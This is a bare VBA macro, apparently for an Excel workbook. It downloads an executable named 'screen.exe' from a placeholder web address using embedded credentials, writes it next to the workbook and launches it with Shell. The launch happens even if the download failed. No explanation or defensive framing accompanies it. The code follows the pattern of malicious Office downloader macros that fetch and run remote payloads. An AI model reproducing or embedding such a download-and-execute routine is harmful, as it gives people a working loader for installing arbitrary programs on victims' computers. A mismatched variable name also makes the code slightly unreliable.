Sub DownloadFileFromURL()
    Dim FileUrl As String
    Dim objeXmlHttpReq As Object
    Dim objStream As Object
    
    FileUrl = "http://123456/Y2z7/screen.exe"
    
    Set objXmlHttpReq = CreateObject("Microsoft.XMLHTTP")
    objXmlHttpReq.Open "GET", FileUrl, False, "username", "password"
    objXmlHttpReq.send

    If objXmlHttpReq.Status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Open
        objStream.Type = 1
        objStream.Write objXmlHttpReq.responseBody
        objStream.SaveToFile ThisWorkbook.Path & "\" & "screen.exe", 2
        objStream.Close
    End If
    
    Shell ThisWorkbook.Path & "\" & "screen.exe"
End Sub


